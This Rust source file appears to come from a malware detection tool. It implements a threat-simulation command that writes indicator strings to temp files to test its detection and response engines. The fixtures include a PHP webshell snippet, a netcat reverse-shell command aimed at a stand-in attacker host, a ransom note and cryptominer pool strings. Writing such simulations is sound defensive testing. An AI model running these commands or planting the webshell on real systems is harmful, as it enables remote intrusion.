use anyhow::Result;
use colored::*;
use nkosi_common::config::{NkosiConfig, SimulationScenario};
use nkosi_common::types::*;
use nkosi_db::Database;
use nkosi_engines::{BehaviorEngine, HashEngine, StaticAnalyzer, YaraEngine};
use nkosi_response::ResponseEngine;
use nkosi_risk::{RiskConfig, RiskEngine};
use std::io::Write;
use tempfile::NamedTempFile;
use uuid::Uuid;

pub async fn handle_simulate(
    db: &Database,
    config: &NkosiConfig,
    scenarios: Vec<SimulationScenario>,
) -> Result<()> {
    println!("{}", "╔══════════════════════════════════════╗".cyan());
    println!("{}", "║       Simulation de menaces          ║".cyan());
    println!("{}", "╚══════════════════════════════════════╝".cyan());
    println!();

    let hash_engine = HashEngine::new();
    let yara_engine = YaraEngine::new_prefer_real();
    let static_analyzer = StaticAnalyzer::new();
    let _behavior_engine = BehaviorEngine::new();
    let risk_engine = RiskEngine::new(RiskConfig::default());
    let response_engine = ResponseEngine::new(config.quarantine.path.clone(), Some(db.clone()));

    let mut total_detections = 0u32;
    let mut critical_count = 0u32;

    for scenario in &scenarios {
        println!("  {} Simulation: {:?}", "→".blue(), scenario);

        let detections =
            generate_simulated_detections(scenario, &hash_engine, &yara_engine, &static_analyzer);

        total_detections += detections.len() as u32;

        for detection in &detections {
            let path = detection.file_path.as_deref().unwrap_or("/tmp/simulated");
            let assessment = risk_engine.evaluate(vec![detection.clone().into()]);

            let severity_color = match assessment.level {
                RiskLevel::Malicious => "red",
                RiskLevel::Suspicious => "yellow",
                RiskLevel::Low => "cyan",
                RiskLevel::Clean => "white",
            };

            println!(
                "    {} [{}] {} - Score: {}/100",
                "⚠️".color(severity_color),
                format!("{:?}", detection.engine).color(severity_color),
                detection.rule_name.as_deref().unwrap_or("Unknown"),
                assessment.score
            );

            if assessment.score >= 70 {
                critical_count += 1;
                let action = risk_engine.get_recommended_action(&assessment.level);
                println!(
                    "      Action recommandée: {:?}",
                    format!("{:?}", action).yellow()
                );

                let _ = response_engine
                    .execute_action(
                        &action,
                        Some(path),
                        None,
                        None,
                        assessment.score,
                        &format!("Simulated {:?} detection", scenario),
                    )
                    .await;
            }

            save_simulated_event(db, detection, &assessment, scenario).await?;
        }

        println!();
    }

    println!("{}", "╔══════════════════════════════════════╗".cyan());
    println!("{}", "║       Résumé de la simulation       ║".cyan());
    println!("{}", "╚══════════════════════════════════════╝".cyan());
    println!();
    println!("  {} Menaces simulées: {}", "→".blue(), scenarios.len());
    println!("  {} Détections totales: {}", "→".blue(), total_detections);
    println!("  {} Détections critiques: {}", "→".blue(), critical_count);
    println!();

    Ok(())
}

fn generate_simulated_detections(
    scenario: &SimulationScenario,
    _hash_engine: &HashEngine,
    _yara_engine: &YaraEngine,
    _static_analyzer: &StaticAnalyzer,
) -> Vec<SimulatedDetection> {
    let mut detections = Vec::new();

    match scenario {
        SimulationScenario::Ransomware => {
            if let Ok(mut f) = NamedTempFile::new() {
                let _ = f.write_all(b"All your files have been encrypted. Pay 0.5 BTC to wallet 1A1zP1... to decrypt. bitcoin decrypt wallet ransom README DECRYPT");
                let _ = f.flush();
                let path = f.path().to_string_lossy().to_string();
                detections.push(SimulatedDetection {
                    engine: DetectionEngine::StaticAnalysis,
                    rule_name: Some("Simulated Ransomware Indicators".to_string()),
                    rule_id: Some("SIM-RW-001".to_string()),
                    score: 95,
                    confidence: 0.95,
                    file_path: Some(path),
                });
            }
        }
        SimulationScenario::Cryptominer => {
            if let Ok(mut f) = NamedTempFile::new() {
                let _ = f.write_all(
                    b"stratum+tcp://pool.mining.com:3333 xmrig minerd cpuminer difficulty",
                );
                let _ = f.flush();
                let path = f.path().to_string_lossy().to_string();
                detections.push(SimulatedDetection {
                    engine: DetectionEngine::Yara,
                    rule_name: Some("Simulated Cryptominer".to_string()),
                    rule_id: Some("SIM-CM-001".to_string()),
                    score: 85,
                    confidence: 0.85,
                    file_path: Some(path),
                });
            }
        }
        SimulationScenario::Webshell => {
            if let Ok(mut f) = NamedTempFile::new() {
                let _ = f.write_all(b"<?php eval($_GET['cmd']); system($_POST['cmd']); passthru($_REQUEST['cmd']); shell_exec exec system ?>\n");
                let _ = f.flush();
                let path = f.path().to_string_lossy().to_string();
                detections.push(SimulatedDetection {
                    engine: DetectionEngine::Yara,
                    rule_name: Some("Simulated Webshell".to_string()),
                    rule_id: Some("SIM-WS-001".to_string()),
                    score: 80,
                    confidence: 0.8,
                    file_path: Some(path),
                });
            }
        }
        SimulationScenario::Trojan => {
            detections.push(SimulatedDetection {
                engine: DetectionEngine::Hash,
                rule_name: Some("Simulated Trojan Hash".to_string()),
                rule_id: Some("SIM-TR-001".to_string()),
                score: 100,
                confidence: 1.0,
                file_path: Some("/tmp/simulated_trojan.bin".to_string()),
            });
        }
        SimulationScenario::Spyware => {
            if let Ok(mut f) = NamedTempFile::new() {
                let _ = f.write_all(
                    b"keylogger screen_capture browser_history exfiltrate credential stealer",
                );
                let _ = f.flush();
                let path = f.path().to_string_lossy().to_string();
                detections.push(SimulatedDetection {
                    engine: DetectionEngine::StaticAnalysis,
                    rule_name: Some("Simulated Spyware Indicators".to_string()),
                    rule_id: Some("SIM-SP-001".to_string()),
                    score: 75,
                    confidence: 0.75,
                    file_path: Some(path),
                });
            }
        }
        SimulationScenario::Backdoor => {
            if let Ok(mut f) = NamedTempFile::new() {
                let _ = f.write_all(
                    b"nc -e /bin/sh attacker.com 4444 reverse_shell backdoor remote_access",
                );
                let _ = f.flush();
                let path = f.path().to_string_lossy().to_string();
                detections.push(SimulatedDetection {
                    engine: DetectionEngine::StaticAnalysis,
                    rule_name: Some("Simulated Backdoor".to_string()),
                    rule_id: Some("SIM-BD-001".to_string()),
                    score: 90,
                    confidence: 0.9,
                    file_path: Some(path),
                });
            }
        }
    }

    detections
}

#[derive(Debug, Clone)]
struct SimulatedDetection {
    engine: DetectionEngine,
    rule_name: Option<String>,
    rule_id: Option<String>,
    score: u32,
    confidence: f32,
    file_path: Option<String>,
}

impl From<SimulatedDetection> for Detection {
    fn from(sim: SimulatedDetection) -> Self {
        Self {
            id: Uuid::new_v4(),
            event_id: Uuid::new_v4(),
            incident_id: None,
            detection_engine: sim.engine,
            rule_id: sim.rule_id,
            rule_name: sim.rule_name,
            confidence: sim.confidence,
            score_contribution: sim.score,
            details: Some(format!("Simulated detection (score: {})", sim.score)),
        }
    }
}

async fn save_simulated_event(
    db: &Database,
    detection: &SimulatedDetection,
    assessment: &nkosi_risk::RiskAssessment,
    scenario: &SimulationScenario,
) -> Result<()> {
    let mut event = Event::new(EventType::Detection, "simulator_cli");
    event.file_path = detection.file_path.clone();
    event.score = Some(assessment.score);
    event.severity = match assessment.level {
        RiskLevel::Malicious => Severity::Critical,
        RiskLevel::Suspicious => Severity::High,
        RiskLevel::Low => Severity::Medium,
        RiskLevel::Clean => Severity::Info,
    };
    event.result = Some(format!("Simulated {:?} detection", scenario));

    let repo = nkosi_db::EventRepository::new(db);
    repo.insert(&event)?;

    let det_repo = nkosi_db::DetectionRepository::new(db);
    let mut det: Detection = detection.clone().into();
    det.event_id = event.id;
    det_repo.insert(&det)?;

    Ok(())
}
